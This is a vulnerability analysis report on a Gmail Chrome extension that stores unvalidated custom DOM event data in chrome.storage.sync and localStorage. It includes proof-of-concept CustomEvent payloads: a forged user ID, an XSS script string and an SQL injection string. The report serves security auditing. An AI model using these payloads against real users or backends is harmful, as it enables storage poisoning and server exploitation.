# CoCo Analysis: jcohkdgajeablpholinambjfpfkfjgdi

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: document_eventListener_gmailFetchUser → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jcohkdgajeablpholinambjfpfkfjgdi/opgen_generated_files/cs_0.js
Line 467: Content script listens for custom "gmailFetchUser" event and stores event.detail in chrome.storage.sync

**Code:**

```javascript
// cs_0.js (content.min.js) - Content script on mail.google.com
var k = chrome.storage.sync;
k = chrome.storage ? chrome.storage.sync : microsoft.storage.sync;

// Entry point: Custom event listener - attacker can dispatch this event
document.addEventListener("gmailFetchUser", function(t) {
    // ... other code ...

    // Attacker-controlled data flows to storage
    k.set({gmailFetchUser: t.detail}, function() {}); // ← chrome.storage.sync.set with attacker data
    s = t.detail; // ← Also stored in variable
    localStorage.setItem("gmailFetchUser", t.detail); // ← Also stored in localStorage

    chrome.runtime.sendMessage({user: t.detail}, function(e) {});
    // ... continues with backend requests using this data ...
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** Custom DOM event

**Attack:**

```javascript
// Malicious code injected on mail.google.com (or via XSS/malicious script)
// Attacker can dispatch custom "gmailFetchUser" event to poison storage

// Attack 1: Storage poisoning with malicious user ID
var maliciousEvent = new CustomEvent("gmailFetchUser", {
    detail: "attacker_controlled_user_id"
});
document.dispatchEvent(maliciousEvent);

// Attack 2: Inject arbitrary string to corrupt extension state
var maliciousEvent = new CustomEvent("gmailFetchUser", {
    detail: "<script>alert('XSS')</script>"
});
document.dispatchEvent(maliciousEvent);

// Attack 3: Inject SQL injection payload if backend is vulnerable
var maliciousEvent = new CustomEvent("gmailFetchUser", {
    detail: "'; DROP TABLE users; --"
});
document.dispatchEvent(maliciousEvent);
```

**Impact:** An attacker who controls the webpage (e.g., via XSS on mail.google.com or by intercepting/modifying the Gmail page) can dispatch a custom "gmailFetchUser" event with arbitrary data. This attacker-controlled data is stored in chrome.storage.sync and localStorage, and is subsequently used throughout the extension including in backend API requests to geotrack.email. While the extension is designed to run only on mail.google.com (a trusted domain), this vulnerability allows an attacker who compromises Gmail (via XSS or MITM) to poison the extension's storage with malicious data, potentially leading to account confusion, unauthorized access to the backend service with forged user IDs, or backend exploitation if the server-side doesn't properly validate the user_id parameter.

**Note:** Per the methodology, we IGNORE manifest.json content_scripts matches restrictions. The presence of document.addEventListener for a custom event means ANY code running on that page can dispatch the event and exploit this flow, including attacker-injected scripts via XSS or compromised third-party resources on Gmail.
